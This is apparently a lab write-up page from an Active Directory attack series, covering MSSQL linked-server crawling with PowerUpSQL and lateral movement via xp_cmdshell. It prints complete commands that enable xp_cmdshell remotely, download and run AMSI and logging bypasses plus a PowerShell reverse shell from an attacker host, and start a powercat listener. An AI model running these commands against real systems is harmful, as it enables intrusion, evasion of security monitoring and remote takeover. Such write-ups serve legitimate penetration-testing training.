+<p><code>Get-SQLServerLinkCrawl</code> from <strong>PowerUpSQL</strong> is a powerful function used to <strong>automatically crawl database trust links</strong> by recursively enumerating linked servers. Instead of manually querying each linked server, this command systematically follows trust relationships, identifying <strong>all accessible SQL instances</strong> that can be reached from the initial foothold.</p>
+<p>This automation is useful for <strong>mapping out multi-hop trust paths</strong>, where an attacker can pivot through <strong>chained linked servers</strong> to access deeper parts of the network. If a linked server <strong>inherits authentication from the current session</strong>, <code>Get-SQLServerLinkCrawl</code> will attempt to use those credentials to enumerate further, identifying <strong>new SQL targets and potential privilege escalation opportunities</strong>.</p>
+<p>This technique is especially valuable when dealing with <strong>large or complex environments</strong> where manually tracking linked servers would be inefficient. By automating the discovery process, an we can quickly build a <strong>trust relationship map</strong>, helping determine <strong>which linked servers allow execution, data access, or further lateral movement opportunities</strong>.</p>
+<p><code>Get-SQLServerLinkCrawl -Instance 'US-MSSQL' -Version</code></p>
+<img src="./images/screenshot_412.png" alt="image">
+<img src="./images/screenshot_413.png" alt="image">
+<p>Our <strong>PowerUpSQL enumeration</strong> using <code>Get-SQLServerLinkCrawl</code> revealed a <strong>multi-hop trust path</strong> between MSSQL servers, confirming <strong>linked servers and privilege inheritance</strong> across the environment.</p>
+<ul>
+<li>The enumeration started at <strong>US-MSSQL</strong>, where the current user (<strong>studentuser163</strong>) has <strong>limited privileges</strong> (<code>IsSysAdmin: 0</code>). The only linked server found here is <strong>192.168.23.25</strong>.</li>
+<li>Upon crawling <strong>192.168.23.25</strong>, we found another <strong>linked SQL server: DB-SQLSRV</strong>. The user here (<code>dbuser</code>) has <strong>sysadmin privileges (</strong><code>IsSysAdmin: 1</code><strong>)</strong>, meaning full control over this instance.</li>
+<li>Finally, the crawl followed the trust path to <strong>DB-SQLSRV</strong>, where the <strong>"sa" account</strong> was identified as having <strong>sysadmin privileges</strong>. No further linked servers were discovered beyond this point.</li>
+</ul>
+<h3><strong>Key Takeaways from the Enumeration:</strong></h3>
+<ol>
+<li><strong>There is a clear attack path from US-MSSQL → 192.168.23.25 → DB-SQLSRV</strong>, with increasing privileges along the way.</li>
+<li><strong>DB-SQLSRV is the most valuable target</strong>, as it is linked through <code>192.168.23.25</code>, and the <code>sa</code> account has <strong>sysadmin privileges</strong>, allowing full control.</li>
+<li><strong>Privilege escalation is possible</strong> by leveraging <strong>the dbuser account on 192.168.23.25</strong>, which already has <strong>sysadmin access</strong> and could potentially be used to pivot to DB-SQLSRV.</li>
+<li><strong>Lateral movement is viable</strong> using <strong>nested OPENQUERY</strong> or executing commands via linked server queries if <code>rpcout</code> is enabled.</li>
+</ol>
+<p>The enumeration confirms that <strong>DB-SQLSRV is the final target with full control</strong>, and the next step is to determine if <strong>remote command execution</strong> is possible through linked server abuse.</p>
+<p>This confirms exactly what was found during the <strong>manual enumeration using HeidiSQL</strong>.</p>
+<p>If <code>xp_cmdshell</code> is enabled, or if <code>rpcout</code> is set to <code>true</code>, allowing us to enable <code>xp_cmdshell</code>, it becomes possible to execute system commands on any SQL server within the linked database network. This means that if a server in the trust chain has <code>xp_cmdshell</code> already enabled, executing commands directly on that system is straightforward. However, if it is disabled but <code>rpcout</code> is enabled, an attacker can <strong>first enable </strong><code>xp_cmdshell</code><strong> remotely and then execute commands</strong> on that target.</p>
+<p>The ability to execute commands across linked servers significantly expands the attack surface. Instead of being limited to the initial SQL instance, an attacker can <strong>move laterally</strong> by executing commands on other linked servers, leveraging inherited privileges. If a low-privileged SQL user on one server has access to a linked server where a more privileged account is in use, enabling <code>xp_cmdshell</code> there could lead to <strong>privilege escalation</strong>, potentially reaching <strong>NT AUTHORITY\SYSTEM</strong> or even <strong>domain administrator access</strong> if the SQL service runs under a privileged domain account.</p>
+<p>This technique is extremely powerful when combined with trust abuses in multi-forest environments. If the linked server exists in another trusted domain or forest, executing commands remotely could allow pivoting into <strong>isolated or higher-privileged environments</strong> that wouldn’t be accessible otherwise. The key condition is that either <code>xp_cmdshell</code> is already enabled, or <code>rpcout</code> allows an attacker to enable it remotely, making <strong>database trust relationships a critical vector for exploitation</strong>.</p>
+<p>Let’s now enumerate if <code>xp_cmdshell</code> is enabled on <code>DB-SQLPROD</code>(192.168.23.25) trying to execute <code>whoami</code> which is an OS command on <code>xp_cmdshell</code>.</p>
+<p><code>Get-SQLServerLinkCrawl -instance 'US-MSSQL' -Query 'Exec master..xp_cmdshell "whoami"'</code></p>
+<img src="./images/screenshot_414.png" alt="image">
+<p>Or we could also use the <code>-QueryTarget</code> flag to specify what instance we want to make this query to.</p>
+<p><code>Get-SQLServerLinkCrawl -instance 'US-MSSQL' -Query 'Exec master..xp_cmdshell "whoami"' -QueryTarget 'DB-SQLPROD'</code></p>
+<img src="./images/screenshot_415.png" alt="image">
+<p>As we can see above enumeration, we are able to confirm that <code>xp_cmdshell</code> is enabled on <code>DB-SQLPROD</code>(192.168.23.25) by checking the information on <code>CustomQuery</code> property of our ouptput above.</p>
+<h1>MSSQL Reverse Shell via <code>xp_cmdShell</code></h1>
+<p>The enumeration confirmed that <code>xp_cmdshell</code><strong> is enabled on DB-SQLSRV (192.168.23.25)</strong>, allowing us to execute <strong>OS-level commands</strong> directly from SQL Server. The <code>whoami</code> command returned <code>nt service\mssqlserver</code>, indicating that the SQL service is running with <strong>local service privileges</strong>.</p>
+<p>With <code>xp_cmdshell</code> enabled, we can now leverage this misconfiguration to establish a <strong>reverse shell</strong> from DB-SQLSRV back to our attack machine. This will give us direct <strong>command-line access</strong>, bypassing SQL restrictions and allowing us to move further into the system.</p>
+<h2>Edit Invoke-PowerShellTcp.ps1</h2>
+<p><strong>Invoke-PowerShellTcp.ps1</strong> is a PowerShell script designed to create a <strong>reverse shell</strong> connection from a compromised machine to an attacker's system. It establishes an interactive <strong>PowerShell session</strong> over TCP, allowing remote command execution once the connection is established.</p>
+<p>To ensure the reverse shell executes immediately when the script is imported, the file was <strong>modified by appending the command</strong>: <code>reverse -Reverse -IPAddress 192.168.100.163 -Port 443</code></p>
+<p>This forces the script to initiate a <strong>reverse connection to 192.168.100.163 on port 443 (</strong>our attacking machine<strong>)</strong> as soon as it is loaded into memory. Instead of requiring manual execution after importing, the payload runs automatically, streamlining the attack process.</p>
+<p>Now, we can <strong>host the script on an HTTP server</strong> and use <code>xp_cmdshell</code> on <code>DB-SQLSRV</code> to download and execute it, establishing a <strong>PowerShell reverse shell</strong> back to our listener.</p>
+<img src="./images/screenshot_416.png" alt="image">
+<h2>Hosting files local files</h2>
+<p>We should be hosting all the files we will be requesting further more in our attacking host. This will be requested by our Target <code>DB-SQLSRV</code>.</p>
+<img src="./images/screenshot_417.png" alt="image">
+<h3>Disabling Defender</h3>
+<p>Before we carry on with our target host, we need to disable our firewall on our side. This way we can host the file on our machine with no issues, without having the firewall complaining.</p>
+<img src="./images/screenshot_418.png" alt="image">
+<h2>Listening on port 443 for Reverse Shell</h2>
+<p>Let’s use <code>PowerCat.ps1</code> so we can start listening on port<strong> 443 </strong>on our attacking machine, a PowerShell-based networking tool similar to Netcat.</p>
+<p>Once the <strong>Invoke-PowerShellTcp.ps1</strong> script is executed on <strong>DB-SQLSRV</strong>, it will initiate a <strong>reverse connection to this listener</strong>, providing an <strong>interactive PowerShell session</strong> on the compromised machine.</p>
+<img src="./images/screenshot_419.png" alt="image">
+<p>Now, let's proceed with <strong>getting a reverse shell</strong> using <code>xp_cmdshell</code>.</p>
+<p><code>Get-SQLServerLinkCrawl -instance 'US-MSSQL' -Query 'Exec master..xp_cmdshell ''Powershell -c "IEX(IWR http://192.168.100.163/sbloggingbypass.txt -UseBasicParsing); IEX(IWR http://192.168.100.163/amsibypass.txt -UseBasicParsing); IEX(IWR http://192.168.100.163/Invoke-PowerShellTcpEx.ps1 -UseBasicParsing)"'''</code></p>
+<img src="./images/screenshot_420.png" alt="image">
+<p>The command imports and executes <code>sbloggingbypass.txt</code> and <code>amsibypass.txt</code> <strong>before</strong> loading <code>Invoke-PowerShellTcpEx.ps1</code> into memory. These first two files are used to <strong>disable security mechanisms</strong> that could detect and block the execution of <strong>Invoke-PowerShellTcpEx.ps1</strong>.</p>
+<ol>
+<li><code>sbloggingbypass.txt</code></li>
+<ul>
+<li>This script <strong>disables Script Block Logging</strong>, a Windows security feature that logs executed PowerShell commands and scripts.</li>
+<li>By bypassing this, the attack becomes <strong>less detectable in event logs</strong>, reducing forensic visibility.</li>
+<li><code>amsibypass.txt</code></li>
+<li>This script <strong>disables or evades AMSI (Antimalware Scan Interface)</strong>, which is responsible for scanning PowerShell scripts before execution.</li>
+<li>Without this, AMSI could detect <strong>Invoke-PowerShellTcpEx.ps1</strong> and prevent it from running.</li>
+<li><code>Invoke-PowerShellTcpEx.ps1</code></li>
+</ul>
+</ol>
+<p>By executing these scripts <strong>in sequence</strong>, the command ensures that <strong>defensive mechanisms are neutralized first</strong>, making the final <strong>reverse shell execution more stealthy and harder to detect</strong>.</p>
+<p>NOTE: Once we execute our command to get the reverse shell we should go to the other CMD running our <code>PowerCat.ps1</code> and hit at <code>ENTER</code> at least twice.</p>
+<img src="./images/screenshot_421.png" alt="image">
+<p>As we can see above we were able to get reverse shell on <code>DB-SQLPROD</code>(192.168.23.25).</p>
+<p>Since the <strong>linked server from DB-SQLProd to DB-SQLSrv</strong> is configured to use the <code>sa</code><strong> account</strong>, it inherits <strong>sysadmin privileges</strong>. This means that any command executed on <strong>DB-SQLProd</strong> through the linked server will run with <strong>full administrative rights on DB-SQLSrv</strong>.</p>
+<p>By enabling <strong>RPC, RPC Out</strong> and <strong>xp_cmdshell</strong> on <strong>DB-SQLSrv</strong>, we gain the ability to execute <strong>remote commands on that server</strong> through the linked SQL connection.</p>
+<p>Bare in mind that <code>Invoke-SqlCmd</code> is <strong>not installed by default</strong> on servers running MSSQL. It is part of the <strong>SQLServer PowerShell module</strong>, which may or may not be present on a target system.</p>
+<p>We can senumerate that by running the following command and we can confirm that Invoke-SqlCmd is availble via SQLPS.</p>
+<p><code>Get-Command -Module SQLPS</code></p>
+<img src="./images/screenshot_422.png" alt="image">
+<p>So we can move on now by running the 4 following command below and exit right after..</p>
+<p><code>Invoke-SqlCmd -Query "exec sp_serveroption @server='db-sqlsrv', @optname='rpc', @optvalue='TRUE'"Invoke-SqlCmd -Query "exec sp_serveroption @server='db-sqlsrv', @optname='rpc out', @optvalue='TRUE'"Invoke-SqlCmd -Query "EXECUTE ('sp_configure ''show advanced options'',1;reconfigure;') AT ""db-sqlsrv"""Invoke-SqlCmd -Query "EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure') AT ""db-sqlsrv"""</code></p>
+<img src="./images/screenshot_423.png" alt="image">
+<p>If you get the following error above, it is super normal. just make sure that you are able to execute the for commands stated above.</p>
+<p>From our attacking machine, we can can try to execute whoami OS command but this time, we should point it to our target server using <code>-QueryTarget</code> which is <code>DB-SQLSRV</code>, to confirm if we were able to enable <code>RPC</code> and <code>XP_CMDSHELL</code>.</p>
+<p><code>Get-SQLServerLinkCrawl -instance 'US-MSSQL' -Query 'Exec master..xp_cmdshell "whoami"'</code></p>
+<img src="./images/screenshot_424.png" alt="image">
+<p>As we can see above, our command <code>whoami</code><strong> </strong>has been successufully executed on both <strong>DB-SQLPROD</strong> and <strong>DB-SQLSRV</strong> server and we can see now <code>db\srvdb</code> <strong>DB-SQLSRV</strong>.</p>
+<p>Now that we were able to configure <strong>RPC, RPC OUT, XP_CMDSHELL</strong> and we have confirmation that we do have <code>Remote Code Execution</code> on <strong>DB-SQLSRV,</strong> we can now do the same we did previously on <code>DB-SQLPROD</code> to get Reverse Shell by using the <code>-QueryTarget</code> flag, this way our command is execited on <code>DB-SQLSRV</code> server only.</p>
+<p>We can exit from <code>DB-SQLPROD</code> and starting a new listening on port 443 again using powercat.</p>
+<p><code>powercat -l -v -p 443 -t 1000</code></p>
+<img src="./images/screenshot_425.png" alt="image">
+<p>With the new listener we can now execute the command to get our reverse shell again. Remember to hit ENTER twice on our powercat listener.</p>
+<p><code>Get-SQLServerLinkCrawl -instance 'US-MSSQL' -Query 'Exec master..xp_cmdshell ''Powershell -c "IEX(IWR http://192.168.100.163/sbloggingbypass.txt -UseBasicParsing); IEX(IWR http://192.168.100.163/amsibypass.txt -UseBasicParsing); IEX(IWR http://192.168.100.163/Invoke-PowerShellTcpEx.ps1 -UseBasicParsing)"''' -QueryTarget 'DB-SQLSRV'</code></p>
+<img src="./images/screenshot_426.png" alt="image">
+<img src="./images/screenshot_427.png" alt="image">
+<ul>
+<li>This is the actual <strong>reverse shell payload</strong>, which will be executed after the security mechanisms are disabled.</li>
+<li>Since <strong>sblogging and AMSI have already been bypassed</strong>, it runs without being blocked or logged.</li>
+</ul>
+</ul>
+          <div class="part-navigation">
+            <a href="part-30-cross-forest-attacks---injecting-si.html"><ion-icon name="arrow-back-outline"></ion-icon> Previous: Cross Forest Attacks</a>
+            <a href="part-32-cross-forest-attacks---foreign-secu.html">Next: Cross Forest Attacks <ion-icon name="arrow-forward-outline"></ion-icon></a>
+          </div>
+        </div>
+      </article>
+    </div>
+  </main>
+  <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
+  <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+  <script src="../assets/js/script.js"></script>
+</body>
+</html>
